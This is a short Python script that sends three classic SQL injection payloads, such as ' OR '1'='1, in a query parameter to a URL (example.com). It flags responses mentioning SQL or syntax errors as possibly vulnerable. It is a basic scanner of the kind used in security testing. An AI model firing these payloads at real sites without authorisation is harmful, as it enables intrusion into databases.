import requests

def test_sql_injection(url, parameter):
    payloads = ["' OR '1'='1", '" OR "1"="1', "' OR 'a'='a"]
    vulnerable = []

    for payload in payloads:
        test_url = f"{url}?{parameter}={payload}"
        response = requests.get(test_url)
        if "SQL" in response.text or "syntax" in response.text:
            vulnerable.append(test_url)
    
    return vulnerable

if __name__ == "__main__":
    target_url = "http://example.com/search"
    parameter = "query"
    vulnerabilities = test_sql_injection(target_url, parameter)
    print(f"Possible SQL Injection vulnerabilities: {vulnerabilities}")
